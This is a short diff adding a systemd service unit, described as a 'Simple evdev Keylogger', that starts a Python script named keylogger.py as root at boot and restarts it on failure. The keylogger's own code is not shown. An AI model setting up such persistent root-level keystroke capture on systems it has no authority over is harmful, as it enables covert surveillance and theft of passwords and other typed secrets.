@@ -1,0 +1,12 @@
+[Unit]
+Description=Simple evdev Keylogger
+After=multi-user.target
+
+[Service]
+Type=simple
+ExecStart=/usr/bin/env python3 /home/hp/g/keylogger.py
+Restart=on-failure
+User=root
+
+[Install]
+WantedBy=multi-user.target
